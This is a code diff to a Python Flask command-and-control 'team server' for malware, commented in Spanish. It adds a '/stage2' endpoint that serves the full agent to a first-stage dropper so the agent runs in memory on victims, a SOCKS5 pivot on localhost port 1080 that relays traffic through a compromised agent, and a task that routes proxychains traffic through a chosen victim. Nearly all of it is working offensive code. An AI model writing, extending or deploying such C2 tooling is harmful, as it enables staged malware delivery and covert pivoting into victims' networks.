@@ -3,7 +3,7 @@ log = logging.getLogger('werkzeug')
 log.setLevel(logging.DEBUG)
 
 from flask import Flask, request, render_template, jsonify, redirect, url_for, session as flask_session
-import json, base64, urllib.parse, os, time, uuid, hashlib
+import json, base64, urllib.parse, os, time, uuid, hashlib, socket, select, threading
 
 try:
     from Crypto.Cipher import AES, PKCS1_OAEP
@@ -165,12 +165,39 @@ def agent_response():
             task_id = payload.get('task_id')
             cmd = payload.get('command')
             
+            if task_id == 'SOCKS_DOWNSTREAM':
+                try:
+                    socks_data = json.loads(payload.get('payload', '[]'))
+                    for up_conn_id, action, up_b64 in socks_data:
+                        if action == 'DATA' and up_conn_id in socks_active_tunnels:
+                            socks_active_tunnels[up_conn_id].sendall(base64.b64decode(up_b64))
+                        elif action == 'CLOSE' and up_conn_id in socks_active_tunnels:
+                            socks_active_tunnels[up_conn_id].close()
+                            del socks_active_tunnels[up_conn_id]
+                except: pass
+                return "", 200
+            
             if cmd == 'register': # Legacy compat
                 pass
             elif task_id:
                 resultados_tareas[task_id] = payload
             
     return "", 200
+
+@app.route('/stage2')
+def serve_stage2():
+    """Sirve agent_v2 completo al dropper Stage1 (en memoria, sin disco en víctima)."""
+    ua = request.headers.get('User-Agent', '')
+    if not ua:
+        return '', 404
+    try:
+        src = 'agent_v2.py'
+        if not os.path.exists(src): return '', 404
+        with open(src, 'r', encoding='utf-8') as f:
+            code = f.read()
+        return code, 200, {'Content-Type': 'text/plain; charset=utf-8'}
+    except Exception:
+        return '', 500
 
 # =========================================================
 # PANEL WEB & ADMIN ROUTES
@@ -246,6 +273,12 @@ def api_add_task():
             
             return jsonify({'status':'ok', 'task_id': task_id, 'msg': 'Kill Dispatched & System Purged'})
             
+        elif cmd == 'route':
+            global socks_target_agent
+            socks_target_agent = agent_id
+            msg = f"SOCKS5 Routing enlazado permanentemente. Todo el tráfico de Proxychains TCP a 127.0.0.1:1080 saldrá a través del Agente {agent_id}."
+            return jsonify({'status':'ok', 'task_id': task_id, 'msg': msg})
+            
         else:
             task_payload = {'command': cmd, 'task_id': task_id, 'args': args}
             tareas_pendientes.setdefault(agent_id, []).append(task_payload)
@@ -261,6 +294,87 @@ def api_get_results():
     return jsonify(res)
 
 if __name__ == '__main__':
+    load_state()
+    # === MÓDULO 3: SOCKS5 C2 TUNNEL ROUTER ===
+    socks_active_tunnels = {}
+    socks_target_agent = None
+
+    def SOCKS5_Server():
+        global socks_target_agent
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            server.bind(('127.0.0.1', 1080))
+            server.listen(10)
+            print("[*] MÓDULO 3: SOCKS5 Pivot Local activado en 127.0.0.1:1080")
+        except Exception as e:
+            print(f"[-] No se pudo levantar SOCKS5: {e}")
+            return
+
+        while True:
+            try:
+                client, addr = server.accept()
+                threading.Thread(target=handle_socks5_client, args=(client,), daemon=True).start()
+            except: pass
+
+    def handle_socks5_client(client):
+        global socks_target_agent
+        if not socks_target_agent or socks_target_agent not in agentes_activos:
+            client.close()
+            return
+            
+        try:
+            client.recv(2) # version, nmethods
+            client.recv(10) # methods
+            client.sendall(b'\x05\x00')
+            
+            req = client.recv(4)
+            if not req or req[1] != 1:
+                client.close()
+                return
+            
+            address_type = req[3]
+            if address_type == 1: dest_addr = socket.inet_ntoa(client.recv(4))
+            elif address_type == 3: dest_addr = client.recv(client.recv(1)[0]).decode()
+            else:
+                client.close()
+                return
+
+            dest_port = int.from_bytes(client.recv(2), 'big', signed=False)
+            
+            conn_id = str(uuid.uuid4())[:8]
+            socks_active_tunnels[conn_id] = client
+            
+            task = {
+                'command': 'socks_connect', 
+                'task_id': f'socks_{conn_id}', 
+                'args': json.dumps({'conn_id': conn_id, 'host': dest_addr, 'port': dest_port})
+            }
+            tareas_pendientes.setdefault(socks_target_agent, []).append(task)
+            
+            client.sendall(b'\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00')
+            
+            while True:
+                r, _, _ = select.select([client], [], [], 0.5)
+                if r:
+                    data = client.recv(8192)
+                    if data:
+                        t = {
+                            'command': 'socks_write',
+                            'task_id': f'socksw_{conn_id}',
+                            'args': json.dumps({'conn_id': conn_id, 'data': base64.b64encode(data).decode('utf-8')})
+                        }
+                        tareas_pendientes.setdefault(socks_target_agent, []).append(t)
+                    else: break
+                else:
+                    if conn_id not in socks_active_tunnels: break
+        except: pass
+        finally:
+            client.close()
+            if 'conn_id' in locals() and conn_id in socks_active_tunnels:
+                del socks_active_tunnels[conn_id]
+
+    threading.Thread(target=SOCKS5_Server, daemon=True).start()
+
     print("==================================================")
     print("   C2 TEAM SERVER (MULTIPLAYER WEB DASHBOARD)     ")
     print("==================================================")
